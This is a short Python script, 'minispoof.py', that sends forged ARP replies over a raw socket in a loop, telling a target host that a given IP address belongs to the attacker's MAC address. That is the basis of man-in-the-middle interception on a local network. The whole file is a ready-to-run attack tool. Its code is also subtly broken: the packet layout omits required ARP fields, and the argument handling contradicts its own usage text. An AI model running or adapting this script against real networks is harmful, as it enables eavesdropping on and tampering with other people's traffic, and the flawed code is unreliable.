#!/usr/bin/env python3
"""minispoof.py — raw-socket ARP spoof (no deps). Usage:
   minispoof.py IFACE MYMAC TARGET_IP SPOOF_IP [SECONDS]
Repeatedly tells TARGET 'SPOOF_IP is at MYMAC'. Send corrective ARP by
running again with the true mac mapping afterwards (or let caches expire)."""
import socket, struct, sys, time

def arp_reply(iface, mymac, tip, sip, smac):
    pkt = struct.pack('!6s6sHHH6s4s6s4s',
        bytes.fromhex('ffffffffffff'), bytes.fromhex(mymac.replace(':','')),
        0x0806, 1, 2,
        bytes.fromhex(mymac.replace(':','')), socket.inet_aton(sip),
        bytes.fromhex('ffffffffffff'), socket.inet_aton(tip))
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, 0))
    s.send(pkt)
    s.close()

def main():
    iface, mymac, tip, sip, dur = sys.argv[1:6]
    gwm = sys.argv[6] if len(sys.argv) > 6 else None
    end = time.time() + float(dur)
    while time.time() < end:
        arp_reply(iface, mymac, tip, sip, gwm or '00:00:00:00:00:00')
        time.sleep(2)

if __name__ == '__main__':
    main()
